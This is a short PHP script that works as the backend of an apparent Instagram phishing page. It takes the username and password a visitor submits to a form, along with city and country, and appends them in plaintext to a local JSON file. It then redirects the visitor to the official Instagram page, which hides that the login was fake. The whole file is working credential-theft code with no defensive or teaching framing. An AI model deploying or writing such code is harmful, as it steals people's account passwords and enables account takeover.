<?php
// Check if a POST request was received
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the form data
    $username = isset($_POST["username"]) ? $_POST["username"] : "";
    $password = isset($_POST["password"]) ? $_POST["password"] : "";
    $city = isset($_POST["city"]) ? $_POST["city"] : "";
    $country = isset($_POST["country"]) ? $_POST["country"] : "";

    // Create an array to hold the new form data
    $newFormData = [
        "username" => $username,
        "password" => $password,
        "city" => $city,
        "country" => $country
    ];

    // Define the file path for mydetails.json
    $filePath = 'mydetails2.json';

    // Read the existing JSON data from the file
    $existingData = file_exists($filePath) ? file_get_contents($filePath) : '[]';

    // Decode the existing JSON data into an array
    $existingFormData = json_decode($existingData, true);

    // Append the new form data to the existing data
    $existingFormData[] = $newFormData;

    // Encode the updated data as JSON
    $jsonData = json_encode($existingFormData);

    // Save the JSON data back to the file
    file_put_contents($filePath, $jsonData);

    // Redirect the user to the official Instagram page
    header('Location: https://www.instagram.com/instagram/');
    exit;
} else {
    // Respond with an error if it's not a POST request
    http_response_code(400); // Bad Request
    echo 'Invalid request. Please use POST to submit the form.';
}
?>
